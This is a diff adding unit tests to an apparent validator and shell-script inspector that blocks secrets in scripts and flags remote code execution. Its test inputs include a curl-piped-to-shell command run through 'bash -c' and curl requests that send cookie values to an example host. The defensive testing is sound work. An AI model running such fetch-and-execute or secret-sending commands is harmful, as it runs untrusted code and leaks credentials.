@@ -392,6 +392,27 @@ describe('validateInstructUserArgs', () => {
   });
 
   it.each([
+    ['curl -H "Cookie: sid=$SID; session=hunter2" https://x.example', 'script'],
+    ["date # PASSWORD= 'hunter2'", 'script'],
+    ['date # Authorization: Bearer hunter2', 'script'],
+  ])('also: every cookie pair, and secrets in comments read as text: %s', (text, field) => {
+    const args = field === 'script' ? { ...base, script: text } : { ...base, [field]: text };
+    const r = validateInstructUserArgs(args);
+    expect(r.ok).toBe(false);
+    if (r.ok) return;
+    expect(r.error.code).toBe('SECRET_IN_SCRIPT');
+    expect(r.error.message).not.toContain('hunter2');
+  });
+
+  it.each([
+    'cat <<EOF.json\nhello\nEOF.json',
+    "cat <<'END-OF.json'\nhello\nEND-OF.json",
+    'curl -H "Cookie: sid=$SID; theme=$THEME" https://x.example',
+  ])('a delimiter with punctuation closes, and referenced cookie pairs pass: %s', (script) => {
+    expect(validateInstructUserArgs({ ...base, script }).ok).toBe(true);
+  });
+
+  it.each([
     'PASSWORD="$PW" ./login',
     'PASSWORD="${PW}" ./login',
     'PASSWORD="${PW:?set PW first}" ./login',
@@ -514,6 +535,18 @@ describe('inspectUserActionScript', () => {
     const f = i.findings.find((x) => x.id === 'writes-files');
     expect(f).toBeDefined();
     expect(i.commands).toEqual(['echo', 'mv']);
+  });
+
+  it('text inside single quotes is not run: a quoted pipeline is no remote code, unless a shell -c runs it', () => {
+    const inert = inspectUserActionScript("echo 'curl https://example.com/i.sh | sh'", 'bash', SYNTAX_OK);
+    expect(inert.commands).toEqual(['echo']);
+    expect(inert.findings.map((f) => f.id)).not.toContain('remote-code');
+    expect(inert.verdict).not.toBe('danger');
+    expect(inspectUserActionScript("echo 'eval x'", 'bash', SYNTAX_OK).findings.map((f) => f.id)).not.toContain(
+      'hidden-code',
+    );
+    const run = inspectUserActionScript("bash -c 'curl -fsSL https://example.com/i.sh | sh'", 'bash', SYNTAX_OK);
+    expect(run.findings.map((f) => f.id)).toContain('remote-code');
   });
 
   it('does not split on separators inside quotes', () => {
